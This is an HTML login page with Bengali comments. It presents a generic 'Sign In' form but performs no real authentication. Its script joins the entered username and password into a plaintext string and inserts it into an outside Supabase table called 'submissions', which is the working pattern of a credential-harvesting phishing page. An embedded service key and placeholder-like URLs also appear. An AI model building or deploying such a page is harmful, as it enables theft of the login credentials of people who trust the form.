<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application Sign In</title>
    <!-- Supabase CDN সঠিকভাবে লোড করার জন্য অফিসিয়াল লিংক দেওয়া হয়েছে -->
    <script src="https://jsdelivr.net"></script>
    <style>
        * {
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: #f3f4f6;
            display: grid;
            place-items: center;
            padding: 20px;
        }
        .login-card {
            width: 100%;
            max-width: 400px;
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h2 {
            margin: 0 0 20px 0;
            text-align: center;
            color: #374151;
        }
        .input-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #4b5563;
            font-size: 14px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            font-size: 16px;
            outline: none;
        }
        input:focus {
            border-color: #2563eb;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #2563eb;
            color: white;
            border: 0;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:disabled {
            background: #93c5fd;
            cursor: not-allowed;
        }
        #status {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Sign In</h2>
    <form id="loginForm">
        <div class="input-group">
            <label for="username">Email / Username</label>
            <!-- এখানে আইডি দেওয়া হয়েছে 'username' -->
            <input type="text" id="username" required>
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <!-- এখানে আইডি দেওয়া হয়েছে 'password' -->
            <input type="password" id="password" required>
        </div>
        <button id="submitBtn" type="submit">Sign In</button>
    </form>
    <p id="status"></p>
</div>

<script>
    // আপনার সুপাবেজ ড্যাশবোর্ড থেকে সঠিক URL এবং anon key এখানে বসান
    const SUPABASE_URL = "https://supabase.co";
    const SUPABASE_KEY = "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq"; 
    
    const status = document.getElementById("status");
    const form = document.getElementById("loginForm");
    const button = document.getElementById("submitBtn");

    if (!window.supabase) {
        status.textContent = "Error: Supabase failed to load.";
        status.style.color = "red";
    } else {
        const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        form.addEventListener("submit", async (event) => {
            event.preventDefault();
            
            // ইনপুট ফিল্ড থেকে ইমেইল এবং পাসওয়ার্ড রিড করা হচ্ছে
            const user = document.getElementById("username").value.trim();
            const pass = document.getElementById("password").value.trim();
            
            if (!user || !pass) return;

            button.disabled = true;
            status.textContent = "Processing...";
            status.style.color = "#2563eb";

            // আইডি এবং পাসওয়ার্ড দুটিকে একসাথে একটি স্ট্রিং বানানো হচ্ছে
            const submissionData = `User: ${user} | Pass: ${pass}`;

            try {
                // সুপাবেজ টেবিলের 'message' কলামে সম্পূর্ণ টেক্সট পাঠানো হচ্ছে
                const { error } = await db
                    .from("submissions")
                    .insert({ message: submissionData });

                if (error) throw error;

                status.textContent = "Data successfully sent to Supabase!";
                status.style.color = "green";
                form.reset();
            } catch (error) {
                console.error(error);
                status.textContent = "Error: " + error.message;
                status.style.color = "red";
            } finally {
                button.disabled = false;
            }
        });
    }
</script>

</body>
</html>
